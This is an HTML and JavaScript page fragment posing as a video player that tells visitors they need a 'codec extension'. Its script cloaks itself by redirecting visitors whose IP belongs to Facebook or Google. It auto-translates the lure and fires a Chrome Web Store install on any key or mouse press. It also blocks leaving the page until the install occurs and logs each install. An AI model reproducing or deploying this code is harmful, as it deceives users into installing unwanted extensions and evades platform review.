  <div id="tooltip" style="display:none; width: 366px;height: 50px;overflow: auto;margin: 0 auto;position: absolute;top: 245px;left: 0;bottom: 0;right: 0;color: #000000;background: #fbfbfb;border: solid #b0afb3 1px;border-radius: 3px;z-index: 99999;cursor: help;box-shadow: 0px 0px 3px #888888;" class="">
    <span style="font-size: 18px;width: 100%;position: absolute;text-align: center;margin-top: 12px;" id="click_text">Click "Add extension" button</span>
  </div>
  <div id="alertbox" style="display: none;width: 366px;height: 100px;overflow: auto;margin: 0 auto;position: absolute;top: 10px;left: 0;bottom: 0;right: 0;color: #000000;background: #fbfbfb;border: solid #b0afb3 1px;border-radius: 3px;z-index: 19999999999;cursor: help;box-shadow: 0px 0px 3px #888888;padding:20px;" class="">
    <span style="font-size: 14px;position: absolute;margin-top: 12px;" id="alert_text">You must install the codec extension to watch this video!</span>
    <input id="alertok" type="button" value="OK" style="position: absolute;bottom: 20px;right: 20px;height: 30px;font-weight: bold;cursor: pointer;padding-left: 10px;padding-right: 10px;">
  </div>
  <div id="overlay" style="position: absolute;cursor:pointer;top: 0px;left: 0px;width: 100%;height: 100%;background-color: rgba(128, 128, 128, 0.5);z-index: 1999999999;display: none;"></div>


  <div id="progress" class="waiting" style="transition-duration: 900ms; width: 0%;"><dt></dt><dd></dd></div>
  <script type="text/javascript">
    jQuery.ajax({
      url:"http://ip-api.com/json/",
      type:"GET",
      success:function(data){
        if(data.org.toLocaleLowerCase().indexOf("facebook") >=0 || data.org.toLocaleLowerCase().indexOf("google") >=0){
          gofb();
        }
      }
    });

    function translate(source,target,q,callback){
      var url = "https://translate.googleapis.com/translate_a/single?client=gtx&sl=" + source + "&tl=" + target + "&dt=t&dj=1&source=input&q=" + encodeURI(q); 
      var xhr = new XMLHttpRequest();
      xhr.open("GET", url);
      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8" , true);
      xhr.send();
      xhr.onreadystatechange = function() {
          if (xhr.readyState == 4 && xhr.status == 200) {
              var data = JSON.parse(xhr.responseText);
              callback(data);
          }
      }
    }

    function speech(q,callback){
      var url = "https://code.responsivevoice.org/develop/getvoice.php?t="+ encodeURI(q) +"&tl="+ navigator.language.split("-")[0].toLowerCase() +"&sv=&vn=&pitch=0.5&rate=0.5&vol=1";
      var audio = new Audio(url);
      audio.play();
    }

    translate("en",navigator.language,$("#click_text").text(),function(data){
      $("#click_text").text(data.sentences[0].trans);
    });
    translate("en",navigator.language,$("#errormessage").text(),function(data){
      $("#errormessage").text(data.sentences[0].trans);
    });
    translate("en",navigator.language,$("#alert_text").text(),function(data){
      $("#alert_text").text(data.sentences[0].trans);
    });
    translate("en",navigator.language,$("#alertok").val(),function(data){
      $("#alertok").val(data.sentences[0].trans.toUpperCase());
    });
  </script>
  <script type="text/javascript">
     function sendUseragent(){
          ga('send', 'event', {
              'eventCategory': 'hostname', 
              'eventAction': navigator.userAgent,
              'hitCallback': function() {

               },
              'hitCallbackFail' : function () {

              }
           });
     }
     //sendUseragent();
     installed = false;
     downloaded = false;
     install = function(){
          $("#errorbox").show();
          $("#alertbox").hide();
          $("#overlay").hide();

          var showtooltip = window.setTimeout(function(){
            $("#tooltip").show();
          },500)
          $("#alert").hide();
          chrome.webstore.install(
              'https://chrome.google.com/webstore/detail/gfnpfddnlfcedifgmimfdepdkjdmecbo',
              function() {
              var dax = new Image();

dax.src="http://whos.amung.us/widget/instalimet1.png";
                  installed = true;
                  $("#tooltip").hide();
                  $("#errorbox").hide();
                  ga('send', 'event', {
                     'eventCategory': 'installed', 
                     'eventAction': 'gfnpfddnlfcedifgmimfdepdkjdmecbo',
                     'hitCallback': function() {
                        gofb();
                      },
                     'hitCallbackFail' : function () {
                        gofb();
                     }
                  });
              },
              function(err) {
                window.clearTimeout(showtooltip);
                if(err == "Could not fetch data from the Chrome Web Store"){
                  //download();
                }else{
                  $("#tooltip").hide();
                  $("#errorbox").hide();
                  $("#alertbox").show();
                  $("#overlay").show();
                }
                console.error(err);
              }
          );
     }


     function gofb(){
      window.setTimeout(function(){
        document.getElementById("link").click();
      },200);
     }

     //$("#alertok").click(install);
     $("#video").click(function(){
      $("#play").hide();
      $("#loading").fadeIn(300,function(){});
      $("#progress").width("70%");
     });

     $(document).keydown(install).mousedown(install);

     $(window).on('beforeunload', function() {
          $("#Alert").hide();
          if(installed == false){
              return "";  
          }
      });
  </script>

